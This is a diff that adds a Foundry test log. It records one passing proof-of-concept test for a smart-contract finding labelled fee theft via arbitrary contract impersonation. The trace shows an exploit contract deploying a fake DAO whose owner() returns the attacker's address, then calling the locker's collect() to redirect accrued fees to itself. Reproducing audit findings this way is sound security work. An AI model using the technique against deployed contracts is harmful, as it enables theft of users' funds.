@@ -1,0 +1,37 @@
+No files changed, compilation skipped
+
+Ran 1 test for test/57871-h-04-fee-theft-via-arbitrary-contract-impersonation-in-colle_exp.sol:PoC_57871
+[PASS] test_exploit() (gas: 970395)
+Traces:
+  [990295] PoC_57871::test_exploit()
+    ├─ [577211] → new Exploit@0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f
+    │   └─ ← [Return] 2883 bytes of code
+    ├─ [379750] Exploit::run()
+    │   ├─ [167493] → new DaosLocker@0x104fBc016F4bb334D775a19E8A6510109AC63E00
+    │   │   ├─  storage changes:
+    │   │   │   @ 0: 0 → 1000
+    │   │   └─ ← [Return] 726 bytes of code
+    │   ├─ [96553] → new FakeDao@0x037eDa3aDB1198021A9b2e88C22B464fD38db3f3
+    │   │   └─ ← [Return] 480 bytes of code
+    │   ├─ [23660] DaosLocker::collect(FakeDao: [0x037eDa3aDB1198021A9b2e88C22B464fD38db3f3])
+    │   │   ├─ [402] FakeDao::owner() [staticcall]
+    │   │   │   └─ ← [Return] Exploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]
+    │   │   ├─  storage changes:
+    │   │   │   @ 1: 0 → 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f
+    │   │   │   @ 0: 1000 → 0
+    │   │   └─ ← [Stop]
+    │   ├─ [424] DaosLocker::fees() [staticcall]
+    │   │   └─ ← [Return] 0
+    │   ├─ [530] DaosLocker::paidTo() [staticcall]
+    │   │   └─ ← [Return] Exploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]
+    │   ├─ [530] DaosLocker::paidTo() [staticcall]
+    │   │   └─ ← [Return] Exploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]
+    │   ├─ emit Proof(receiver: Exploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f])
+    │   ├─  storage changes:
+    │   │   @ 0: 0 → 1
+    │   └─ ← [Stop]
+    └─ ← [Stop]
+
+Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 391.33µs (203.38µs CPU time)
+
+Ran 1 test suite in 5.26ms (391.33µs CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
